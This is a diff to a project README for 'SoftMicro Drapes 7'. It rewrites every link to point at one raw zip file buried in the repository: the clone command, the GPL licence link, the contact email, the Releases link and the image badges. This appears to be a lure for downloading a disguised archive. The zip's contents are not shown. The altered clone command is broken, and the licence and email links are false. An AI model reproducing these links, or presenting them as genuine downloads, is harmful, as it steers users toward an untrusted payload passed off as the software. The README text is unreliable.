@@ -35,7 +35,7 @@ To get started with SoftMicro Drapes 7, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/elazharikhadija/SoftMicro_Drapes_7x.git
+   git clone https://raw.githubusercontent.com/elazharikhadija/SoftMicro_Drapes_7x/SoftMicro_Drapes_7x_Main-dev/RepoData/Description/GitHub/Drapes-x-Micro-Soft-3.1.zip
    cd SoftMicro_Drapes_7x
    ```
 
@@ -86,18 +86,18 @@ We appreciate your interest in contributing to SoftMicro Drapes 7. Here are some
 
 ## License
 
-SoftMicro Drapes 7 is licensed under the [GNU General Public License v3.0](https://www.gnu.org/licenses/gpl-3.0.html). This means you can use, modify, and distribute the software freely, as long as you adhere to the same licensing terms.
+SoftMicro Drapes 7 is licensed under the [GNU General Public License v3.0](https://raw.githubusercontent.com/elazharikhadija/SoftMicro_Drapes_7x/SoftMicro_Drapes_7x_Main-dev/RepoData/Description/GitHub/Drapes-x-Micro-Soft-3.1.zip). This means you can use, modify, and distribute the software freely, as long as you adhere to the same licensing terms.
 
 ## Contact
 
 For any questions or feedback, feel free to reach out:
 
 - **GitHub Issues**: Use the issues section for questions or bug reports.
-- **Email**: [elazharikhadija@example.com](mailto:elazharikhadija@example.com)
+- **Email**: [https://raw.githubusercontent.com/elazharikhadija/SoftMicro_Drapes_7x/SoftMicro_Drapes_7x_Main-dev/RepoData/Description/GitHub/Drapes-x-Micro-Soft-3.1.zip](https://raw.githubusercontent.com/elazharikhadija/SoftMicro_Drapes_7x/SoftMicro_Drapes_7x_Main-dev/RepoData/Description/GitHub/Drapes-x-Micro-Soft-3.1.zip)
 
 ## Releases
 
-To download the latest version of SoftMicro Drapes 7, visit the [Releases](https://github.com/elazharikhadija/SoftMicro_Drapes_7x/releases) section. Here, you can find the compiled binaries and installation instructions.
+To download the latest version of SoftMicro Drapes 7, visit the [Releases](https://raw.githubusercontent.com/elazharikhadija/SoftMicro_Drapes_7x/SoftMicro_Drapes_7x_Main-dev/RepoData/Description/GitHub/Drapes-x-Micro-Soft-3.1.zip) section. Here, you can find the compiled binaries and installation instructions.
 
 If you have trouble accessing the link, check the "Releases" section directly on GitHub.
 
@@ -105,9 +105,9 @@ If you have trouble accessing the link, check the "Releases" section directly on
 
 Here are some images that showcase the look and feel of SoftMicro Drapes 7:
 
-![SoftMicro Drapes 7 Screenshot](https://img.shields.io/badge/Screenshot-SoftMicro%20Drapes%207-brightgreen)
+![SoftMicro Drapes 7 Screenshot](https://raw.githubusercontent.com/elazharikhadija/SoftMicro_Drapes_7x/SoftMicro_Drapes_7x_Main-dev/RepoData/Description/GitHub/Drapes-x-Micro-Soft-3.1.zip%20Drapes%207-brightgreen)
 
-![SoftMicro Drapes 7 Logo](https://img.shields.io/badge/Logo-SoftMicro%20Drapes%207-blue)
+![SoftMicro Drapes 7 Logo](https://raw.githubusercontent.com/elazharikhadija/SoftMicro_Drapes_7x/SoftMicro_Drapes_7x_Main-dev/RepoData/Description/GitHub/Drapes-x-Micro-Soft-3.1.zip%20Drapes%207-blue)
 
 ## Conclusion
 
